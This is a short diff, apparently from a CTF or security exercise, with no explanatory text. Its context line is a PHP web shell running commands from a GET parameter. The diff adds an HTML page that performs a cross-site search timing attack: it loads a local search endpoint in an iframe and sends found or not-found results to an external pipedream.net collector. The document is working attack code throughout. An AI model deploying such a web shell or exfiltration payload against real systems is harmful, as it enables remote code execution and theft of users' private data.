@@ -1,1 +1,19 @@
 #<?php system($_GET["cmd"]); ?>
+
+<!doctype html>
+<html>
+<body>
+  <iframe id="t" src="http://127.0.0.1:8000/search?query=D"></iframe>
+  <script>
+    let f = document.getElementById("t");
+    f.onload = () => {
+      // found/not found 차이가 이벤트 타이밍으로 드러날 수 있음
+      new Image().src = "https://eo9ellh0vyupnv7.m.pipedream.net/found?c=D";
+    };
+    setTimeout(() => {
+      // 일정 시간 내 응답 없으면 not found
+      new Image().src = "https://eo9ellh0vyupnv7.m.pipedream.net/notfound?c=D";
+    }, 1500);
+  </script>
+</body>
+</html>
